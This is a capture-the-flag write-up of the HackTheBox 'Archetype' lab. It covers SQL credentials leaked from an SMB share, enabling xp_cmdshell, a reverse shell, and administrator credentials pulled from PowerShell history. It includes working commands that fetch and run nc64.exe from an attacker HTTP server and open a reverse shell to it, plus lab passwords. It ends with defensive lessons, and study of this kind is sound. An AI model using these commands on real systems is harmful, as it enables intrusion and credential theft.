# Archetype

**Platform:** HackTheBox -- Starting Point Tier 2
**OS:** Windows
**Difficulty:** Easy
**Date:** 2026-07-12

---

## Summary

Windows box running SMB and MSSQL. An anonymously accessible SMB share exposes a config file containing SQL Server credentials. From MSSQL, sysadmin privileges allow enabling `xp_cmdshell`, which is used to download `nc64.exe` and establish a reverse shell as `sql_svc`. PowerShell history reveals administrator credentials, which are used with psexec to get a SYSTEM shell.

---

## What We Didn't Know Before vs What We Know Now

| Before | After |
|--------|-------|
| Didn't know SMB shares could expose config files with plaintext credentials | `.dtsConfig` files are SQL Server Integration Services config files -- worth grabbing whenever found on SMB |
| Didn't know `xp_cmdshell` had to be explicitly enabled before use | Must enable `show advanced options` first, then `xp_cmdshell` -- two separate `sp_configure` calls |
| Didn't know `is_srvrolemember('sysadmin')` as a privilege check | MSSQL equivalent of `sudo -l` -- returns 1 if current login has sysadmin role |
| Didn't know PowerShell history was stored and worth checking manually | `ConsoleHost_history.txt` is a standard post-foothold check on Windows -- people type credentials into terminals |

---

## Recon

```bash
nmap -sV -sC -p- --min-rate 5000 <ip>
```

**Open ports:**
- 139/445 -- SMB
- 1433 -- MSSQL (Microsoft SQL Server 2017)
- 5985 -- WinRM

---

## Enumeration

### SMB

```bash
smbclient -L \\\\<ip> -N
```

Shares returned:
- ADMIN$
- C$
- IPC$
- **backups** -- accessible anonymously

```bash
smbclient \\\\<ip>\\backups -N
ls
get prod.dtsConfig
```

Contents of `prod.dtsConfig`:

```xml
<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;...</ConfiguredValue>
```

**Credentials found:**
- User: `ARCHETYPE\sql_svc`
- Password: `M3g4c0rp123`

---

## Foothold

### MSSQL Access

```bash
python3 examples/psexec.py ARCHETYPE/sql_svc:M3g4c0rp123@<ip>
# Note: impacket-mssqlclient with -windows-auth failed -- used GitHub clone instead
python3 examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@<ip> -windows-auth
```

### MSSQL Enumeration

```sql
SELECT name FROM sys.databases;
-- Returns: master, tempdb, model, msdb

SELECT is_srvrolemember('sysadmin');
-- Returns: 1 (confirmed sysadmin)
```

### Enable xp_cmdshell

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### Verify OS access

```sql
EXEC xp_cmdshell 'net user';
-- Returns: Administrator, sql_svc, DefaultAccount, WDAGUtilityAccount, Guest
```

### Transfer nc64.exe to target

On Kali -- set up transfer directory and HTTP server:

```bash
mkdir /home/kali/transfer
mv /path/to/nc64.exe /home/kali/transfer/
cd /home/kali/transfer
sudo python3 -m http.server 80
```

Download nc64.exe onto target via xp_cmdshell (using Downloads as writable staging directory):

```sql
EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<kali_ip>/nc64.exe -outfile nc64.exe";
```

HTTP server confirms GET request -- file downloaded successfully.

### Start listener and catch reverse shell

```bash
sudo nc -lvnp 443
```

Execute nc64.exe on target:

```sql
EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe <kali_ip> 443";
```

Reverse shell caught as `sql_svc`.

### User flag

```cmd
type C:\Users\sql_svc\Desktop\user.txt
```

---

## Privilege Escalation

### PowerShell history

Standard post-foothold check on Windows -- PowerShell logs previously typed commands to:

```
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```cmd
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Output reveals previously typed command:

```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

**Credentials found:**
- User: `administrator`
- Password: `MEGACORP_4dm1n!!`

### psexec -- SYSTEM shell

```bash
python3 examples/psexec.py administrator:MEGACORP_4dm1n\!\!@<ip>
```

Returns SYSTEM shell.

### Root flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Tools Used

- nmap
- smbclient
- impacket (mssqlclient.py, psexec.py) -- GitHub clone required, apt version had compatibility issues
- nc64.exe (Windows netcat binary)
- python3 -m http.server (file transfer)
- netcat (reverse shell listener)

---

## Key Takeaways

**What would have stopped this:**
- SMB share should not have been anonymously accessible
- Config file should not contain plaintext credentials
- `xp_cmdshell` should remain disabled -- it is off by default and should stay that way; enabling it as we did opens a direct path to OS command execution
- PowerShell history could be cleared or disabled via `Set-PSReadlineOption -HistorySaveStyle SaveNothing`
- Administrator should not be reusing credentials typed into a terminal

**Post-foothold Windows checklist additions:**
- Always check `ConsoleHost_history.txt` -- this is a standard manual check, not just a WinPEAS finding
- Try `C:\Users\<user>\Downloads` as a writable staging directory when system paths are locked
- `is_srvrolemember('sysadmin')` is the MSSQL privilege check -- do this before attempting anything that requires elevated SQL permissions